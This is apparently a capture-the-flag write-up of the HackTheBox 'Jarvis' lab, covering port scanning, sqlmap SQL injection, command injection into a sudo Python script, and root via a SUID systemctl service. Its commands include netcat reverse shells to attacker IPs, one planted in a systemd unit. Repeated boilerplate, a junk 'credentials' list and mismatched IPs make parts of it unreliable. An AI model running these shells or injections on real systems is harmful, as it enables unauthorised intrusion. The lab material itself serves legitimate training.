---
title: "HackTheBox - Jarvis (Linux)"
date: 2026-02-27
description: "HackTheBox Jarvis Linux マシン解説。サービス列挙・初期足がかり・権限昇格経路を解説。"
categories: [HackTheBox, Linux]
tags: [php, privilege-escalation, rce, suid]
mermaid: true
content_lang: ja
alt_en: /posts/htb-jarvis/
---

## 概要

| 項目 | 内容 |
|---------------------------|-------|
| OS | Linux |
| 難易度 | 記録なし |
| 攻撃対象 | 22/tcp (ssh), 80/tcp (http), 64999/tcp (http) |
| 主な侵入経路 | SQL injection in exposed web functionality |
| 権限昇格経路 | SUID enumeration -> GTFOBins-compatible binary abuse -> root/administrator |

## 偵察

-
- rustscan
- nmap
- systemctl
- sqlmap
This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
rustscan -a $ip -r 1-65535 --ulimit 5000
```

```bash
✅[0:44][CPU:11][MEM:42][TUN0:10.10.14.140][/home/n0z0]
🐉 > rustscan -a $ip -r 1-65535 --ulimit 5000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Port scanning: Making networking exciting since... whenever.

[~] The config file is expected to be at "/home/n0z0/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.229.137:22
Open 10.129.229.137:80

```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
grc nmap -p- -sCV -sV -T4 -A -Pn "$ip" \
-oX "$HOME/work/scans/$(date +%Y%m%d-%H%M%S)_${ip}.xml"
```

```bash
✅[0:44][CPU:11][MEM:42][TUN0:10.10.14.140][...n0z0/work/htb/TartarSauce]
🐉 > grc nmap -p- -sCV -sV -T4 -A -Pn "$ip" \
  -oX "$HOME/work/scans/$(date +%Y%m%d-%H%M%S)_${ip}.xml"
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-24 00:44 JST
Warning: 10.129.229.137 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.129.229.137
Host is up (0.26s latency).
Not shown: 65519 closed tcp ports (reset)
PORT      STATE    SERVICE      VERSION
22/tcp    open     ssh          OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp    open     http         Apache httpd 2.4.25 ((Debian))
|_http-title: Stark Hotel
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.25 (Debian)
755/tcp   filtered unknown
1476/tcp  filtered clvm-cfg
1653/tcp  filtered alphatech-lm
5912/tcp  filtered fis
12882/tcp filtered unknown
18373/tcp filtered unknown
26978/tcp filtered unknown
30792/tcp filtered unknown
42947/tcp filtered unknown
43894/tcp filtered unknown
45634/tcp filtered unknown
47688/tcp filtered unknown
60237/tcp filtered unknown
64999/tcp open     http         Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=10/24%OT=22%CT=1%CU=39879%PV=Y%DS=2%DC=T%G=Y%TM=68FA50
OS:AE%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=8)SE
OS:Q(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%TS=8)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z
OS:%II=I%TS=8)SEQ(SP=106%GCD=1%ISR=107%TI=Z%II=I%TS=8)OPS(O1=M552ST11NW7%O2
OS:=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11)W
OS:IN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=N)ECN(R=Y%DF=Y%
OS:T=40%W=7210%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=
OS:)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T4(R=Y%DF=Y
OS:%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=
OS:AR%O=%RD=0%Q=)T6(R=N)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)
OS:U1(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)I
OS:E(R=Y%DFI=N%TG=40%CD=S)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   304.72 ms 10.10.14.1
2   304.83 ms 10.129.229.137

```

💡 なぜ有効か  
High-quality reconnaissance turns broad network exposure into a short list of exploitable paths. Service/version context allows precision targeting instead of blind exploitation attempts.

## 初期足がかり

![Screenshot showing exploitation evidence on jarvis (step 1)](/assets/img/htb/jarvis/Pasted%20image%2020251025123307.png)
*Caption: Screenshot captured during jarvis at stage 1 of the attack chain.*

![Screenshot showing exploitation evidence on jarvis (step 2)](/assets/img/htb/jarvis/Pasted%20image%2020251025124146.png)
*Caption: Screenshot captured during jarvis at stage 2 of the attack chain.*

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
sqlmap –u http://10.129.229.137/room.php?cod=1 --dbs --batch --os-shell
```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
rlwrap -cAri nc -lvnp 4444
```

```bash
✅[1:42][CPU:8][MEM:47][TUN0:10.10.14.140][/home/n0z0]
🐉 > rlwrap -cAri nc -lvnp 4444
listening on [any] 4444 ...
```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
cat /etc/passwd
```

```bash
www-data@jarvis:/var/www/Admin-Utilities$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
messagebus:x:105:110::/var/run/dbus:/bin/false
pepper:x:1000:1000:,,,:/home/pepper:/bin/bash
mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:107:65534::/run/sshd:/usr/sbin/nologin

```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
sudo -l
```

```bash
www-data@jarvis:/var/www/Admin-Utilities$ sudo -l
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py

```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
```

```bash
www-data@jarvis:/home/pepper$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es

***********************************************

Enter an IP: 10.10.14.140
PING 10.10.14.140 (10.10.14.140) 56(84) bytes of data.
64 bytes from 10.10.14.140: icmp_seq=1 ttl=63 time=255 ms
64 bytes from 10.10.14.140: icmp_seq=2 ttl=63 time=250 ms
```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)

```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
echo -e '#!/bin/bash\n\nnc -e /bin/bash 10.10.14.140 3333' > /tmp/d.sh
chmod +x /tmp/d.sh
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
```

```bash
www-data@jarvis:/var/www/html$ echo -e '#!/bin/bash\n\nnc -e /bin/bash 10.10.14.140 3333' > /tmp/d.sh
www-data@jarvis:/var/www/html$ chmod +x /tmp/d.sh
www-data@jarvis:/var/www/html$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es

***********************************************

Enter an IP: $(/tmp/d.sh)
```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
rlwrap -cAri nc -lvnp 3333
export TERM=xterm
script /dev/null -c bash
stty raw -echo && fg
id
cd ~/
ls -la
cat user.txt
```

```bash
❌[14:34][CPU:1][MEM:58][TUN0:10.10.14.140][...n0z0/work/htb/TartarSauce]
🐉 > rlwrap -cAri nc -lvnp 3333       
listening on [any] 3333 ...
connect to [10.10.14.140] from (UNKNOWN) [10.129.229.137] 59320
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
script /dev/null -c bash
stty raw -echo && fg
pepper@jarvis:/var/www/html$ export TERM=xterm
pepper@jarvis:/var/www/html$ script /dev/null -c bash
Script started, file is /dev/null
stty raw -echo && fg
pepper@jarvis:/var/www/html$ stty raw -echo && fg
bash: fg: current: no such job
pepper@jarvis:/var/www/html$ 
pepper@jarvis:/var/www/html$ id
uid=1000(pepper) gid=1000(pepper) groups=1000(pepper)
pepper@jarvis:/var/www/html$ cd ~/
pepper@jarvis:~$ ls -la
total 32
drwxr-xr-x 4 pepper pepper 4096 May  9  2022 .
drwxr-xr-x 3 root   root   4096 May  9  2022 ..
lrwxrwxrwx 1 root   root      9 Mar  4  2019 .bash_history -> /dev/null
-rw-r--r-- 1 pepper pepper  220 Mar  2  2019 .bash_logout
-rw-r--r-- 1 pepper pepper 3526 Mar  2  2019 .bashrc
drwxr-xr-x 2 pepper pepper 4096 May  9  2022 .nano
-rw-r--r-- 1 pepper pepper  675 Mar  2  2019 .profile
drwxr-xr-x 3 pepper pepper 4096 May  9  2022 Web
-r--r----- 1 root   pepper   33 Oct 24 23:12 user.txt
pepper@jarvis:~$ cat user.txt
9f26414a024ef8efbe5f42e6a55e8891
```

![Screenshot showing exploitation evidence on jarvis (step 3)](/assets/img/htb/jarvis/Pasted%20image%2020251025145446.png)
*Caption: Screenshot captured during jarvis at stage 3 of the attack chain.*

💡 なぜ有効か  
Initial access succeeds when a real weakness is chained to controlled execution, credential theft, or authenticated pivoting. Captured outputs and callbacks validate that compromise is reproducible.

## 権限昇格

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
find / -xdev -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
```

```bash
pepper@jarvis:~$ find / -xdev -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
-rwsr-xr-x 1 root root 30800 Aug 21  2018 /bin/fusermount
-rwsr-xr-x 1 root root 44304 Mar  7  2018 /bin/mount
-rwsr-xr-x 1 root root 61240 Nov 10  2016 /bin/ping
-rwsr-x--- 1 root pepper 174520 Jun 29  2022 /bin/systemctl
-rwsr-xr-x 1 root root 31720 Mar  7  2018 /bin/umount
-rwsr-xr-x 1 root root 40536 Mar 17  2021 /bin/su
-rwxr-sr-x 1 root shadow 35592 May 27  2017 /sbin/unix_chkpwd
-rwxr-sr-x 1 root ssh 358624 Mar  1  2019 /usr/bin/ssh-agent
-rwxr-sr-x 1 root crontab 40264 Oct 29  2021 /usr/bin/crontab
-rwxr-sr-x 1 root mail 19008 Jan 17  2017 /usr/bin/dotlockfile
-rwxr-sr-x 1 root shadow 71856 Mar 17  2021 /usr/bin/chage
-rwxr-sr-x 1 root tty 27448 Mar  7  2018 /usr/bin/wall
-rwsr-xr-x 1 root root 40312 Mar 17  2021 /usr/bin/newgrp
-rwxr-sr-x 1 root shadow 22808 Mar 17  2021 /usr/bin/expiry
-rwsr-xr-x 1 root root 59680 Mar 17  2021 /usr/bin/passwd
-rwsr-xr-x 1 root root 75792 Mar 17  2021 /usr/bin/gpasswd
-rwxr-sr-x 1 root tty 14768 Apr 12  2017 /usr/bin/bsd-write
-rwsr-xr-x 1 root root 40504 Mar 17  2021 /usr/bin/chsh
-rwsr-xr-x 1 root root 140944 Jan 23  2021 /usr/bin/sudo
-rwsr-xr-x 1 root root 50040 Mar 17  2021 /usr/bin/chfn
-rwxr-sr-x 1 root utmp 10232 Feb 18  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 440728 Mar  1  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 42992 Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper

```

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
cat >0xdf.service<<EOF [Service] Type=notify ExecStart=/bin/bash -c 'nc -e /bin/bash 10.10.14.8 443' KillMode=process Restart=on-failure RestartSec=42s [Install] WantedBy=multi-user.target EOF
```

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
systemctl link /dev/shm/0xdf.service
systemctl start 0xdf
```

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
rlwrap -cAri nc -lvnp 6666
cat root.txt
```

```bash
✅[14:47][CPU:2][MEM:58][TUN0:10.10.14.140][/home/n0z0]
🐉 > rlwrap -cAri nc -lvnp 6666
listening on [any] 6666 ...
connect to [10.10.14.140] from (UNKN
root@jarvis:/root# cat root.txt
e793ed164ddec143311e6b0b9e949ded
root@jarvis:/root# 

```

GTFOBins technique note: this path works because a privileged binary executes attacker-controlled arguments and preserves elevated effective privileges into the spawned shell process.

💡 なぜ有効か  
Privilege escalation depends on trust boundary mistakes such as unsafe sudo rules, writable execution paths, SUID abuse, or credential reuse. Enumerating and validating these conditions is essential for reliable root/administrator access.

## 認証情報

- `0xdf.gitlab.io/2019/11/09/htb-jarvis.html`
- `Tool / Command`
- `home/n0z0]`
- `__  /  ___}`
- `github.com/RustScan/RustScan`
- `home/n0z0/.rustscan.toml"`
- `n0z0/work/htb/TartarSauce]`
- `HOME/work/scans/$(date`
- `22/tcp`

## まとめ・学んだこと

- Validate external attack surface continuously, especially exposed admin interfaces and secondary services.
- Harden secret handling and remove plaintext credentials from reachable paths and backups.
- Limit privilege boundaries: audit SUID binaries, sudo rules, and delegated scripts/automation.
- Keep exploitation evidence reproducible with clear command logs and result validation at each stage.

## 参考文献

- RustScan: https://github.com/RustScan/RustScan
- Nmap: https://nmap.org/
- HackTricks Linux Privilege Escalation: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
- GTFOBins: https://gtfobins.org/
- Certipy: https://github.com/ly4k/Certipy
- BloodHound: https://github.com/BloodHoundAD/BloodHound
